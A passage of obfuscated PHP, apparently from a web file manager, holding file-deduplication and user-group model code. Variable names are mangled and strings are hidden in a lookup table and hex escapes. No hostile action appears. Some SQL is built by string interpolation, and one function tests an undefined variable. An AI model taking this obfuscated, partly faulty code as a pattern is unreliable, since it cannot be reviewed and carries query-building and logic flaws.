CacheLock::lock($ô±¬˜Û); $è¯ÀÒ†ª = $úËµ£î . $æÀ¶á”; if (IO::exist($úËµ£î . $æÀ¶á”)) { $¦ÄëÕÆš = substr($æÀ¶á”, 0, strlen($æÀ¶á”) - strlen($°¶Ö’ñÓ)); $¸æÍûçÈ = $¹ÃñßîÉ ? substr($¹ÃñßîÉ, 0, 5) : ($Ù‚³â  ? substr($Ù‚³â , 0, 5) : rand_string(5)); $è¯ÀÒ†ª = $úËµ£î . $¦ÄëÕÆš . $¸æÍûçÈ . $éÕÕù›[10] . $°¶Ö’ñÓ; } if (IO::isTypeObject($è¯ÀÒ†ª) && !IO::isUploadServer($è¯ÀÒ†ª)) { if (IO::exist($è¯ÀÒ†ª)) { return $è¯ÀÒ†ª; } $·ÓœáÍé = IO::setContent($è¯ÀÒ†ª, $éÕÕù›[12]); if (!$·ÓœáÍé) { show_json($éÕÕù›[1926], !1); } } CacheLock::unlock($ô±¬˜Û); break; case $éÕÕù›[1921]: break; default: break; } return $è¯ÀÒ†ª; } public function addFileByRemote($Š‚ùÃ¸‘, $áÛÂÁ¼—, $£Í£Ï¬€ = array()) { $ÏÆéœÜÆ =& $_SERVER[¹ş¤¶ĞÖ]; if (!IO::exist($Š‚ùÃ¸‘)) { return !1; } $Şı‡ùŞ = $£Í£Ï¬€[$ÏÆéœÜÆ[176]] ? $£Í£Ï¬€[$ÏÆéœÜÆ[176]] : $ÏÆéœÜÆ[12]; $†‚ÇŸ’§ = IO::hashMd5($Š‚ùÃ¸‘, $Şı‡ùŞ); $áù»ñø¼ = KodIO::defaultDriver(); $©ƒå÷©™ = array($ÏÆéœÜÆ[574] => IO::size($Š‚ùÃ¸‘), $ÏÆéœÜÆ[1927] => 1, $ÏÆéœÜÆ[449] => $áÛÂÁ¼—, $ÏÆéœÜÆ[834] => $áù»ñø¼[$ÏÆéœÜÆ[428]], $ÏÆéœÜÆ[450] => $Š‚ùÃ¸‘, $ÏÆéœÜÆ[1928] => $£Í£Ï¬€[$ÏÆéœÜÆ[177]] ? $£Í£Ï¬€[$ÏÆéœÜÆ[177]] : IO::hashSimple($Š‚ùÃ¸‘), $ÏÆéœÜÆ[1929] => $†‚ÇŸ’§ ? $†‚ÇŸ’§ : $Şı‡ùŞ); if ($é—¶¬¡å = $this->addFileCheckExist($©ƒå÷©™[$ÏÆéœÜÆ[177]], $©ƒå÷©™[$ÏÆéœÜÆ[176]], $©ƒå÷©™[$ÏÆéœÜÆ[76]])) { return $é—¶¬¡å; } return $this->addFileData($©ƒå÷©™); } private function addFileData($Ô‹Ì‹ı‚) { $÷¿ÎèÀû =& $_SERVER[¹ş¤¶ĞÖ]; if (!$Ô‹Ì‹ı‚) { return !1; } $Ô‹Ì‹ı‚[$÷¿ÎèÀû[76]] = intval($Ô‹Ì‹ı‚[$÷¿ÎèÀû[76]]); if (!$Ô‹Ì‹ı‚[$÷¿ÎèÀû[76]] && strlen($Ô‹Ì‹ı‚[$÷¿ÎèÀû[177]]) > 32) { $Ô‹Ì‹ı‚[$÷¿ÎèÀû[76]] = intval(substr($Ô‹Ì‹ı‚[$÷¿ÎèÀû[177]], 32)); } $ïáÜû§ = $this->add($Ô‹Ì‹ı‚); return $this->find($ïáÜû§); } public function addFile($úä§Œ², $ºŒÇó¡, $ı¬îêâà = false) { $¤Ï¦Áï¸ =& $_SERVER[¹ş¤¶ĞÖ]; $Î³û‰À© = IO::hashSimple($úä§Œ²); $Àú×® = IO::size($úä§Œ²); $–Ù¤üù¨ = $Àú×® <= 1024 * 1024 * 10 ? IO::hashMd5($úä§Œ²) : $¤Ï¦Áï¸[12]; $°Î“Íˆ½ = $¤Ï¦Áï¸[1930] . $Î³û‰À©; CacheLock::lock($°Î“Íˆ½); if ($–Ù¤üù¨ && $Î³û‰À©) { $à¦±òüë = $this->addFileCheckExist($Î³û‰À©, $–Ù¤üù¨, $Àú×®); if ($à¦±òüë) { CacheLock::unlock($°Î“Íˆ½); return $à¦±òüë; } } $”‘„µÏ‡ = $this->addFileMake($úä§Œ², $Àú×®, $Î³û‰À©, $–Ù¤üù¨, $ºŒÇó¡, $ı¬îêâà); $˜—¤ ÕÏ = $this->addFileData($”‘„µÏ‡); CacheLock::unlock($°Î“Íˆ½); if (!$–Ù¤üù¨ && $˜—¤ ÕÏ) { $this->fileMd5Check($˜—¤ ÕÏ); } return $˜—¤ ÕÏ; } private function fileMd5Check($ÎŠöã£) { $ƒî²Ç =& $_SERVER[¹ş¤¶ĞÖ]; $”ú¹Ø™ = array($ÎŠöã£[$ƒî²Ç[497]], $ÎŠöã£[$ƒî²Ç[84]]); $™ò÷¡Î = $ƒî²Ç[1931] . $ÎŠöã£[$ƒî²Ç[84]]; $ˆ„ú¸° = $ƒî²Ç[1932] . $ÎŠöã£[$ƒî²Ç[497]]; $·ŸÖ‡Ç® = TaskQueue::add($ƒî²Ç[1933], $”ú¹Ø™, $™ò÷¡Î, $ˆ„ú¸°); if (!$·ŸÖ‡Ç®) { $this->fileMd5Set($ÎŠöã£[$ƒî²Ç[497]], $ÎŠöã£[$ƒî²Ç[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($òí¼ƒâ, $ßë†µ) { $£˜È”¹ê =& $_SERVER[¹ş¤¶ĞÖ]; $É½½†ƒœ = $this->find($òí¼ƒâ); if (!$É½½†ƒœ || $É½½†ƒœ[$£˜È”¹ê[176]]) { return; } $ïÈ®´êÜ = IO::hashMd5($ßë†µ); if (!$ïÈ®´êÜ) { return $£˜È”¹ê[12]; } $this->where(array($£˜È”¹ê[497] => $òí¼ƒâ))->save(array($£˜È”¹ê[176] => $ïÈ®´êÜ)); } public function addFileMake($öáõßıÉ, $²ß´‹ò”, $¦¶£ËËŒ, $èÛÂØ˜, $ß©ìîñ, $Ù¹¨¶èø) { $ÜìŒöúğ =& $_SERVER[¹ş¤¶ĞÖ]; $ô™²­ÁÆ = $this->createFileName($ß©ìîñ, $¦¶£ËËŒ, $èÛÂØ˜); $¢¼ÒÎÃ = get_path_father($ô™²­ÁÆ); $éãĞ“ıÈ = get_path_this($ô™²­ÁÆ); if ($Ù¹¨¶èø) { $úÖ‚‹‰ = IO::move($öáõßıÉ, $¢¼ÒÎÃ, !1, $éãĞ“ıÈ); } else { $úÖ‚‹‰ = IO::copy($öáõßıÉ, $¢¼ÒÎÃ, !1, $éãĞ“ıÈ); } if (!$úÖ‚‹‰) { return !1; } $Û˜Ğõ† = KodIO::defaultDriver(); $’ö·ÙÁ® = array($ÜìŒöúğ[574] => $²ß´‹ò”, $ÜìŒöúğ[1927] => 1, $ÜìŒöúğ[449] => $ß©ìîñ, $ÜìŒöúğ[834] => $Û˜Ğõ†[$ÜìŒöúğ[428]], $ÜìŒöúğ[450] => $ô™²­ÁÆ, $ÜìŒöúğ[1928] => $¦¶£ËËŒ, $ÜìŒöúğ[1929] => $èÛÂØ˜); return $’ö·ÙÁ®; } public function addFileCheckExist($‡£¶Ûøæ, $‘×š¬•ì, $¡Ü¢Æ”) { $ÖÍ¤Ô…÷ =& $_SERVER[¹ş¤¶ĞÖ]; $àÒŸ™½ı = $this->findByHash($‡£¶Ûøæ, $‘×š¬•ì); if (!$àÒŸ™½ı) { return !1; } $‘¯¶«³ = array($ÖÍ¤Ô…÷[1927] => intval($àÒŸ™½ı[$ÖÍ¤Ô…÷[1934]]) + 1, $ÖÍ¤Ô…÷[574] => $¡Ü¢Æ”); $this->where(array($ÖÍ¤Ô…÷[498] => $àÒŸ™½ı[$ÖÍ¤Ô…÷[497]]))->save($‘¯¶«³); return $àÒŸ™½ı; } public function remove($üŒ×ä€Ÿ) { $this->linkCountChange($üŒ×ä€Ÿ, !1); $this->clearEmpty(); return !0; } public function linkAdd($À¢Ü„Ïº) { $this->linkCountChange($À¢Ü„Ïº, !0); } public function linkCountChange($óòÁíğ, $ÄÙ§Ñ†) { $˜å€™ªà =& $_SERVER[¹ş¤¶ĞÖ]; if (!$óòÁíğ) { return; } if (!is_array($óòÁíğ)) { $óòÁíğ = array($óòÁíğ); } $Ö€ãÏ•¢ = array(); foreach ($óòÁíğ as $Ÿ£œÙç) { $øËÕùä» = $Ÿ£œÙç . $˜å€™ªà[12]; if (!$Ö€ãÏ•¢[$øËÕùä»]) { $Ö€ãÏ•¢[$øËÕùä»] = 0; } $Ö€ãÏ•¢[$øËÕùä»]++; } $»İêåÅÄ = array(); foreach ($Ö€ãÏ•¢ as $Ÿ£œÙç => $·½½Ğ›) { $øËÕùä» = $·½½Ğ› . $˜å€™ªà[12]; if (!$»İêåÅÄ[$øËÕùä»]) { $»İêåÅÄ[$øËÕùä»] = array(); } $»İêåÅÄ[$øËÕùä»][] = $Ÿ£œÙç; } foreach ($»İêåÅÄ as $·½½Ğ› => $‘ê–¦Í) { if (!$‘ê–¦Í) { continue; } $·½½Ğ› = $ÄÙ§Ñ† ? $·½½Ğ› : -intval($·½½Ğ›); $”İ½¹Ç™ = array($˜å€™ªà[497] => array($˜å€™ªà[7], $‘ê–¦Í)); if ($·½½Ğ› < 0) { $”İ½¹Ç™[$˜å€™ªà[1934]] = array($˜å€™ªà[1048], abs($·½½Ğ›)); } $this->where($”İ½¹Ç™)->setAdd($˜å€™ªà[1934], $·½½Ğ›); } } public function findByHash($İİ˜Ì¯ˆ, $ÔëÚŒí = false) { $¯†Î§ÔÌ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$İİ˜Ì¯ˆ && !$ÔëÚŒí) { return !1; } $ïµÍ½ = array($¯†Î§ÔÌ[1928] => $İİ˜Ì¯ˆ); if ($ÔëÚŒí) { $ïµÍ½ = array($¯†Î§ÔÌ[1929] => $ÔëÚŒí); } return $this->order($¯†Î§ÔÌ[1935])->where($ïµÍ½)->find(); } public function clearEmpty($ıÎù–óµ = 0) { $ÓöÂ¾º¦ =& $_SERVER[¹ş¤¶ĞÖ]; $Ö³Ñ–ş¸ = time() - 3600 * 24 * $ıÎù–óµ; $Å²¹áğÚ = $ÓöÂ¾º¦[1936] . $Ö³Ñ–ş¸; $¡Ê€Ø‚Š = $this->where($Å²¹áğÚ)->select(); if (!$¡Ê€Ø‚Š) { return; } $¢€°‰§ = new Task($ÓöÂ¾º¦[1937], $ÓöÂ¾º¦[12], count($¡Ê€Ø‚Š)); foreach ($¡Ê€Ø‚Š as $ğÉÀÕÆı) { $¢€°‰§->update(1); $this->resetFile($ğÉÀÕÆı); } $¢€°‰§->end(); } public function resetFile($‘¢Âç‘) { $—Ú¦³ıä =& $_SERVER[¹ş¤¶ĞÖ]; $ü–ş––ğ = array($—Ú¦³ıä[498] => $‘¢Âç‘[$—Ú¦³ıä[497]]); $ğÛü®ì = Model($—Ú¦³ıä[1366])->where($ü–ş––ğ)->count(); $í¡Å¼‰ş = Model($—Ú¦³ıä[1938])->where($ü–ş––ğ)->count(); $­Î£Â‡ş = intval($ğÛü®ì) + intval($í¡Å¼‰ş); if ($­Î£Â‡ş == 0) { IO::remove($‘¢Âç‘[$—Ú¦³ıä[84]]); Model($—Ú¦³ıä[1939])->delete($‘¢Âç‘[$—Ú¦³ıä[497]]); $this->where($ü–ş––ğ)->delete(); $this->metaSet($‘¢Âç‘[$—Ú¦³ıä[497]], null, null); return; } if ($‘¢Âç‘[$—Ú¦³ıä[1934]] != $­Î£Â‡ş) { $this->where($ü–ş––ğ)->save(array($—Ú¦³ıä[1927] => $­Î£Â‡ş)); } } public function storageInfo($ØÃ¹¬îµ = false) { $äÃÍã˜¾ =& $_SERVER[¹ş¤¶ĞÖ]; $¡ÓÄ‡½¤ = $this->count() + 0.0; $óîßÄâ = 0; $µÎˆ„×Á = 1; $¹¢ÇÎğ = 0; $Í™¤•¿ï = 5000; for ($º…î—ë¿ = 0; $º…î—ë¿ < $¡ÓÄ‡½¤; $º…î—ë¿ = $º…î—ë¿ + $Í™¤•¿ï) { $şü‹† = $this->limit($º…î—ë¿, $º…î—ë¿ + $Í™¤•¿ï)->select(); foreach ($şü‹† as $ò™¥ÖÇµ) { $µÎˆ„×Á += $ò™¥ÖÇµ[$äÃÍã˜¾[76]] * $ò™¥ÖÇµ[$äÃÍã˜¾[1934]]; $óîßÄâ += $ò™¥ÖÇµ[$äÃÍã˜¾[76]] * ($ò™¥ÖÇµ[$äÃÍã˜¾[1934]] - 1); $¹¢ÇÎğ += $ò™¥ÖÇµ[$äÃÍã˜¾[1934]]; } } $»£§ø¨¿ = array($äÃÍã˜¾[1940] => $µÎˆ„×Á, $äÃÍã˜¾[1941] => $óîßÄâ, $äÃÍã˜¾[1942] => $óîßÄâ / $µÎˆ„×Á, $äÃÍã˜¾[80] => $¡ÓÄ‡½¤, $äÃÍã˜¾[1943] => $¹¢ÇÎğ); return $»£§ø¨¿; } } class GroupModel extends ModelBase { protected $tableName = "\x67\162\157\x75\x70"; protected $tableMeta = array("\x74\141\x62\x6c\145\116\x61\155\x65" => "\147\x72\157\165\160\137\155\x65\x74\141", "\155\x65\164\141\106\151\x65\x6c\x64" => "\147\162\157\x75\x70\111\x44"); protected function cacheFunctionAlias($é‰³ëæ´) { $°ÒøÇ¦¼ =& $_SERVER[¹ş¤¶ĞÖ]; return array($°ÒøÇ¦¼[1944] => array($é‰³ëæ´[0], $°ÒøÇ¦¼[1945]), $°ÒøÇ¦¼[1946] => array($é‰³ëæ´[0], $°ÒøÇ¦¼[1947])); } protected function getInfo($©ªùŠ³™, $½¡×å‰µ = false) { $·çÛŞåÍ = $this->getInfoSimple($©ªùŠ³™); if (!$·çÛŞåÍ) { return !1; } if ($½¡×å‰µ) { return $this->_listDataApplyItem($·çÛŞåÍ); } return $this->cacheFunctionGet($_SERVER[¹ş¤¶ĞÖ][1948], $©ªùŠ³™); } protected function getInfoSimple($Õˆ¥Ä§í, $µà³ş†œ = false) { $¦³Öá™© =& $_SERVER[¹ş¤¶ĞÖ]; if ($µà³ş†œ) { $Í¨î˜÷¨ = array($¦³Öá™©[1866] => intval($Õˆ¥Ä§í)); $»éŒ²¦Ğ = $this->where($Í¨î˜÷¨)->find(); return is_array($»éŒ²¦Ğ) ? $»éŒ²¦Ğ : array(); } return $this->cacheFunctionGet($¦³Öá™©[1949], $Õˆ¥Ä§í); } protected function groupAdd($¥Ü¼«“¼) { $Å¡÷¾ÔŸ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$¥Ü¼«“¼[$Å¡÷¾ÔŸ[461]] && isset($¥Ü¼«“¼[$Å¡÷¾ÔŸ[1866]]) && $¥Ü¼«“¼[$Å¡÷¾ÔŸ[1866]] == 1) { if ($¡õ˜¢ = $this->getInfoSimple($¥Ü¼«“¼[$Å¡÷¾ÔŸ[1866]], !0)) { return $¥Ü¼«“¼[$Å¡÷¾ÔŸ[1866]]; } } else { $¡õ˜¢ = $this->getInfoSimple($¥Ü¼«“¼[$Å¡÷¾ÔŸ[461]]); if (!$¡õ˜¢) { return !1; } } $œ¶µûô = $Å¡÷¾ÔŸ[550]; if ($¡õ˜¢[$Å¡÷¾ÔŸ[540]]) { $œ¶µûô = $¡õ˜¢[$Å¡÷¾ÔŸ[540]] . $¡õ˜¢[$Å¡÷¾ÔŸ[1866]] . $Å¡÷¾ÔŸ[50]; } $×¥»¼–˜ = array($Å¡÷¾ÔŸ[449] => $this->groupNameAuto($¥Ü¼«“¼[$Å¡÷¾ÔŸ[461]], $¥Ü¼«“¼[$Å¡÷¾ÔŸ[32]]), $Å¡÷¾ÔŸ[430] => $¥Ü¼«“¼[$Å¡÷¾ÔŸ[461]], $Å¡÷¾ÔŸ[609] => $œ¶µûô, $Å¡÷¾ÔŸ[1950] => $¥Ü¼«“¼[$Å¡÷¾ÔŸ[1853]], $Å¡÷¾ÔŸ[1951] => 0, $Å¡÷¾ÔŸ[1870] => 0); if (isset($¥Ü¼«“¼[$Å¡÷¾ÔŸ[1890]])) { $×¥»¼–˜[$Å¡÷¾ÔŸ[1890]] = $¥Ü¼«“¼[$Å¡÷¾ÔŸ[1890]]; } else { $øÜˆ°ô = $this->max($Å¡÷¾ÔŸ[1890]); if (!$øÜˆ°ô) { $øÜˆ°ô = 0; } $×¥»¼–˜[$Å¡÷¾ÔŸ[1890]] = $øÜˆ°ô + 1; } if (!empty($¥Ü¼«“¼[$Å¡÷¾ÔŸ[1866]])) { $×¥»¼–˜[$Å¡÷¾ÔŸ[1866]] = $¥Ü¼«“¼[$Å¡÷¾ÔŸ[1866]]; } $ˆÔãõâí = $this->add($×¥»¼–˜); $this->setNamePinyin($ˆÔãõâí, $×¥»¼–˜[$Å¡÷¾ÔŸ[32]]); if (isset($¥Ü¼«“¼[$Å¡÷¾ÔŸ[1952]])) { $this->metaSet($ˆÔãõâí, array($Å¡÷¾ÔŸ[1952] => $¥Ü¼«“¼[$Å¡÷¾ÔŸ[1952]], $Å¡÷¾ÔŸ[1953] => $¥Ü¼«“¼[$Å¡÷¾ÔŸ[1953]])); unset($¥Ü¼«“¼[$Å¡÷¾ÔŸ[1952]]); unset($¥Ü¼«“¼[$Å¡÷¾ÔŸ[1953]]); } Model($Å¡÷¾ÔŸ[1366])->groupRootAdd($ˆÔãõâí); $this->_clearCache($¥Ü¼«“¼[$Å¡÷¾ÔŸ[461]]); return $ˆÔãõâí; } protected function groupEdit($İìˆšú, $ñËõÎÑ¾) { $ş²¬’±Õ =& $_SERVER[¹ş¤¶ĞÖ]; $’€Æ¤àÆ = $this->getInfoSimple($İìˆšú); if (!$’€Æ¤àÆ) { return !1; } if (!empty($ñËõÎÑ¾[$ş²¬’±Õ[461]])) { $ÉœÄ¼ æ = $this->getInfoSimple($ñËõÎÑ¾[$ş²¬’±Õ[461]]); if (!$ÉœÄ¼ æ) { return !1; } if ($’€Æ¤àÆ[$ş²¬’±Õ[1866]] == $ÉœÄ¼ æ[$ş²¬’±Õ[1866]]) { return !1; } if ($ñËõÎÑ¾[$ş²¬’±Õ[461]] != $’€Æ¤àÆ[$ş²¬’±Õ[461]]) { if ($ÉœÄ¼ æ[$ş²¬’±Õ[540]] !== $’€Æ¤àÆ[$ş²¬’±Õ[540]] && strpos($ÉœÄ¼ æ[$ş²¬’±Õ[540]], $’€Æ¤àÆ[$ş²¬’±Õ[540]] . $’€Æ¤àÆ[$ş²¬’±Õ[1866]] . $ş²¬’±Õ[50]) === 0) { return !1; } $ñËõÎÑ¾[$ş²¬’±Õ[609]] = $ÉœÄ¼ æ[$ş²¬’±Õ[540]] . $ñËõÎÑ¾[$ş²¬’±Õ[461]] . $ş²¬’±Õ[50]; $this->_changeChildLevel($’€Æ¤àÆ, $ÉœÄ¼ æ); $this->_clearCache($ÉœÄ¼ æ[$ş²¬’±Õ[1866]]); $this->_clearCache($’€Æ¤àÆ[$ş²¬’±Õ[461]]); } } if (isset($ñËõÎÑ¾[$ş²¬’±Õ[32]])) { $this->setNamePinyin($İìˆšú, $ñËõÎÑ¾[$ş²¬’±Õ[32]]); } if (isset($ñËõÎÑ¾[$ş²¬’±Õ[1952]])) { $this->metaSet($İìˆšú, array($ş²¬’±Õ[1952] => $ñËõÎÑ¾[$ş²¬’±Õ[1952]], $ş²¬’±Õ[1953] => $ñËõÎÑ¾[$ş²¬’±Õ[1953]])); unset($ñËõÎÑ¾[$ş²¬’±Õ[1952]]); unset($ñËõÎÑ¾[$ş²¬’±Õ[1953]]); } $this->_clearChildrenCache($’€Æ¤àÆ); return $this->where(array($ş²¬’±Õ[1954] => $İìˆšú))->save($ñËõÎÑ¾); } private function _clearChildrenCache($•Ò°¡ÚÀ) { $ÀæÁşÃ =& $_SERVER[¹ş¤¶ĞÖ]; $ÒÙ†Í€ = array($ÀæÁşÃ[609] => array($ÀæÁşÃ[569], $•Ò°¡ÚÀ[$ÀæÁşÃ[540]] . $•Ò°¡ÚÀ[$ÀæÁşÃ[1866]] . $ÀæÁşÃ[570])); $úàÖ¦ìÒ = $this->field($ÀæÁşÃ[1866])->where($ÒÙ†Í€)->select(); foreach ($úàÖ¦ìÒ as $ĞŸÖÂÉÙ) { $this->_clearCache($ĞŸÖÂÉÙ[$ÀæÁşÃ[1866]]); } } private function _clearCache($„ºÍİÈĞ) { $²Èœ­ù =& $_SERVER[¹ş¤¶ĞÖ]; $this->cacheFunctionClear($²Èœ­ù[1948], $„ºÍİÈĞ); $this->cacheFunctionClear($²Èœ­ù[1949], $„ºÍİÈĞ); } private function _changeChildLevel($±¤Šœ·ë, $ƒª­’€, $ñ¥Ô™¼Û = false) { $¦¨•ñ¨ =& $_SERVER[¹ş¤¶ĞÖ]; $¬À†ÓÏ€ = $±¤Šœ·ë[$¦¨•ñ¨[540]] . $±¤Šœ·ë[$¦¨•ñ¨[1866]] . $¦¨•ñ¨[50]; $²¾˜óç = $ƒª­’€[$¦¨•ñ¨[540]] . $ƒª­’€[$¦¨•ñ¨[1866]] . $¦¨•ñ¨[50] . $±¤Šœ·ë[$¦¨•ñ¨[1866]] . $¦¨•ñ¨[50]; if ($ñ¥Ô™¼Û) { $²¾˜óç = $ƒª­’€[$¦¨•ñ¨[540]] . $ƒª­’€[$¦¨•ñ¨[1866]] . $¦¨•ñ¨[50]; } $½û€ÆŸ­ = array($¦¨•ñ¨[609] => array($¦¨•ñ¨[569], $±¤Šœ·ë[$¦¨•ñ¨[540]] . $±¤Šœ·ë[$¦¨•ñ¨[1866]] . $¦¨•ñ¨[570])); $Êë’İá† = array($¦¨•ñ¨[609] => array($¦¨•ñ¨[618], "\x72\145\160\x6c\141\143\x65\x28\x70\141\162\x65\156\x74\114\x65\166\145\x6c\x2c\x27{$¬À†ÓÏ€}\x27\x2c\x27{$²¾˜óç}\x27\51")); $this->_clearChildrenCache($±¤Šœ·ë); $this->where($½û€ÆŸ­)->data($Êë’İá†)->save(); } public function setNamePinyin($ú­•‚††, $Á«ã‘›† = false) { $ÆÀõä =& $_SERVER[¹ş¤¶ĞÖ]; if (!$Á«ã‘›†) { $İİ¨Ò›Ä = $this->getInfoSimple($ú­•‚††); $Á«ã‘›† = $İİ¨Ò›Ä[$ÆÀõä[32]]; } if (!Input::check($Á«ã‘›†, $ÆÀõä[612])) { $this->metaSet($ú­•‚††, $ÆÀõä[494], null); $this->metaSet($ú­•‚††, $ÆÀõä[493], null); return; } $™•¬×¼µ = array($ÆÀõä[494] => str_replace($ÆÀõä[53], $ÆÀõä[12], Pinyin::get($Á«ã‘›†)), $ÆÀõä[493] => Pinyin::get($Á«ã‘›†, $ÆÀõä[613])); $this->metaSet($ú­•‚††, $™•¬×¼µ); } protected function groupStatus($Üé—ó€‰, $èê²´«ê) { $ÀÀë‚ØÅ =& $_SERVER[¹ş¤¶ĞÖ]; $ÊÒ®”Ø‰ = $this->getInfoSimple($Üé—ó€‰); if (!$ÊÒ®”Ø‰) { return !1; } if ($èê²´«ê == $ÀÀë‚ØÅ[88]) { $¬¢şÉÙÈ = $this->parentLevelArray($ÊÒ®”Ø‰[$ÀÀë‚ØÅ[540]]); } else { $áª²µ˜Ñ = array($ÀÀë‚ØÅ[609] => array($ÀÀë‚ØÅ[569], $ÊÒ®”Ø‰[$ÀÀë‚ØÅ[540]] . $ÊÒ®”Ø‰[$ÀÀë‚ØÅ[1866]] . $ÀÀë‚ØÅ[570])); $¬¢şÉÙÈ = $this->where($áª²µ˜Ñ)->field($ÀÀë‚ØÅ[1866])->select(); $¬¢şÉÙÈ = array_to_keyvalue($¬¢şÉÙÈ, $ÀÀë‚ØÅ[12], $ÀÀë‚ØÅ[1866]); } $¬¢şÉÙÈ[] = $ÊÒ®”Ø‰[$ÀÀë‚ØÅ[1866]]; $•ˆû†ë = array(); foreach ($¬¢şÉÙÈ as $Üé—ó€‰) { $•ˆû†ë[] = array($ÀÀë‚ØÅ[1866] => $Üé—ó€‰, $ÀÀë‚ØÅ[94] => $ÀÀë‚ØÅ[776], $ÀÀë‚ØÅ[403] => $èê²´«ê); $this->_clearCache($Üé—ó€‰); } return Model($ÀÀë‚ØÅ[1955])->addAll($•ˆû†ë, array(), !0); } protected function groupRemove($–ÚÜÇñø, $š€‹ é = false) { $áºÌ‹³Ö =& $_SERVER[¹ş¤¶ĞÖ]; $’Ùº¶ = array($áºÌ‹³Ö[1866] => $–ÚÜÇñø); $£î¾èî¨ = $this->where($’Ùº¶)->find(); if (!$£î¾èî¨ || $£î¾èî¨[$áºÌ‹³Ö[461]] == 0) { return !1; } if (!$š€‹ é) { $Ş´³µş = $this->getInfoSimple($£î¾èî¨[$áºÌ‹³Ö[461]]); $this->_changeChildLevel($£î¾èî¨, $Ş´³µş, !0); $this->where(array($áºÌ‹³Ö[461] => $–ÚÜÇñø))->save(array($áºÌ‹³Ö[461] => $£î¾èî¨[$áºÌ‹³Ö[461]])); $this->_clearCache($Ş´³µş[$áºÌ‹³Ö[1866]]); } Model($áºÌ‹³Ö[1955])->where($’Ùº¶)->delete(); Model($áºÌ‹³Ö[1956])->where($’Ùº¶)->delete(); Model($áºÌ‹³Ö[851])->groupRootRemove($–ÚÜÇñø); $this->_clearCache($£î¾èî¨[$áºÌ‹³Ö[461]]); return $this->where($’Ùº¶)->delete(); } protected function groupSort($ï‚µ¹¿) { $’ë¿‰›» =& $_SERVER[¹ş¤¶ĞÖ]; $Ş‘êğØÇ = array(); foreach ($ï‚µ¹¿ as $”•«›ß => $Ó¦‘è²­) { $Ş‘êğØÇ[] = array($’ë¿‰›»[1866], $Ó¦‘è²­, $’ë¿‰›»[1890], $”•«›ß + 1); } $this->saveAll($Ş‘êğØÇ); } public function listData() { $¸ã‰ä¶º = $this->_makeOrder()->selectPage(50); $this->_listDataApply($¸ã‰ä¶º[$_SERVER[¹ş¤¶ĞÖ][398]]); return $¸ã‰ä¶º; } private function _makeOrder($ˆ¿Ğöã = '') { $ñéúÅö =& $_SERVER[¹ş¤¶ĞÖ]; $öêÕÓ« = array($ñéúÅö[1866], $ñéúÅö[32], $ñéúÅö[1855], $ñéúÅö[201]); $ÜÖ†§ì = array($ñéúÅö[479] => $ñéúÅö[480], $ñéúÅö[481] => $ñéúÅö[482]); $Üó³«Ù = Input::get($ñéúÅö[486], $ñéúÅö[7], $ñéúÅö[1870], $öêÕÓ«); $òæÆ«µõ = Input::get($ñéúÅö[487], $ñéúÅö[7], $ñéúÅö[1957], array($ñéúÅö[1957], $ñéúÅö[481])); $òæÆ«µõ = $ÜÖ†§ì[$òæÆ«µõ]; $ˆ¿Ğöã = $ˆ¿Ğöã . "{$Üó³«Ù}\40{$òæÆ«µõ}\54\x20\147\162\x6f\165\160\111\x44\40\141\163\x63"; return $this->order($ˆ¿Ğöã); } public function listChild($›ˆÈË¸) { $îŠµš« =& $_SERVER[¹ş¤¶ĞÖ]; $’ÛÔÓ‡ = $this->where(array($îŠµš«[461] => $›ˆÈË¸))->_makeOrder()->selectPage(200); $this->_listDataApply($’ÛÔÓ‡[$îŠµš«[398]]); return $’ÛÔÓ‡; } public function listChildIds($ÜÑÖçˆ†) { $‘œØ‰Öæ =& $_SERVER[¹ş¤¶ĞÖ]; if (is_string($ˆå¾·—)) { $ÜÑÖçˆ† = explode($‘œØ‰Öæ[50], $ÜÑÖçˆ†); } $¨¸¨åôÛ = $this->where(array($‘œØ‰Öæ[1866] => array($‘œØ‰Öæ[7], $ÜÑÖçˆ†)))->field($‘œØ‰Öæ[1958])->select(); if (!$¨¸¨åôÛ) { return !1; } $†úú…Ò = array(); foreach ($¨¸¨åôÛ as $Åöàç¹œ) { $†úú…Ò[] = "\163\145\x6c\145\x63\x74\x20\x67\162\x6f\x75\160\111\104\40\x66\162\x6f\155\40\140\x67\x72\157\x75\160\140\x20\x77\150\145\x72\145\40\x70\141\162\x65\x6e\x74\x4c\145\166\x65\x6c\40\154\x69\x6b\145\x20\47{$Åöàç¹œ[$‘œØ‰Öæ[540]]}{$Åöàç¹œ[$‘œØ‰Öæ[1866]]}\54\x25\x27"; } $†úú…Ò = implode($‘œØ‰Öæ[1959], $†úú…Ò); $¨¸¨åôÛ = $this->query($†úú…Ò); if (!$¨¸¨åôÛ) { return array(); } $ÜÑÖçˆ† = array_to_keyvalue($¨¸¨åôÛ, $‘œØ‰Öæ[12], $‘œØ‰Öæ[1866]); return array_unique($ÜÑÖçˆ†); } public function listByID($¯»şØ¿«) { $çõ‚Í”¾ =& $_SERVER[¹ş¤¶ĞÖ]; if (!$¯»şØ¿«) { return array(); } $ƒüˆÍ = array($çõ‚Í”¾[1866] => array($çõ‚Í”¾[7], $¯»şØ¿«)); $†Ùå›™Ú = $this->where($ƒüˆÍ)->select(); $†Ùå›™Ú = array_sort_keep($†Ùå›™Ú, $çõ‚Í”¾[1866], $¯»şØ¿«); $this->_listDataApply($†Ùå›™Ú); return $†Ùå›™Ú; } public function listSearch($æòÄ‚×¾) { $ÚğÎçŸ =& $_SERVER[¹ş¤¶ĞÖ]; $Ş¿æ£¤• = $æòÄ‚×¾[$ÚğÎçŸ[1960]]; $óâ ÅÖÀ = isset($æòÄ‚×¾[$ÚğÎçŸ[1961]]) ? $æòÄ‚×¾[$ÚğÎçŸ[1961]] : !1; if (!trim($Ş¿æ£¤•)) { return !1; } $Ş¿æ£¤• = str_replace($ÚğÎçŸ[1962], $ÚğÎçŸ[1963], $Ş¿æ£¤•); $ÀÅÓÆÊŸ = array($ÚğÎçŸ[1866] => array($ÚğÎçŸ[412], "{$Ş¿æ£¤•}\45"), $ÚğÎçŸ[32] => array($ÚğÎçŸ[412], "\45{$Ş¿æ£¤•}\45"), $ÚğÎçŸ[1033] => $ÚğÎçŸ[1964]); if ($óâ ÅÖÀ) { $ã•ûÊÁ‰ = $this->getInfoSimple($óâ ÅÖÀ); $Ú—É´ = $ã•ûÊÁ‰[$ÚğÎçŸ[540]] . $óâ ÅÖÀ . $ÚğÎçŸ[570]; $ÀÅÓÆÊŸ = array($ÀÅÓÆÊŸ, 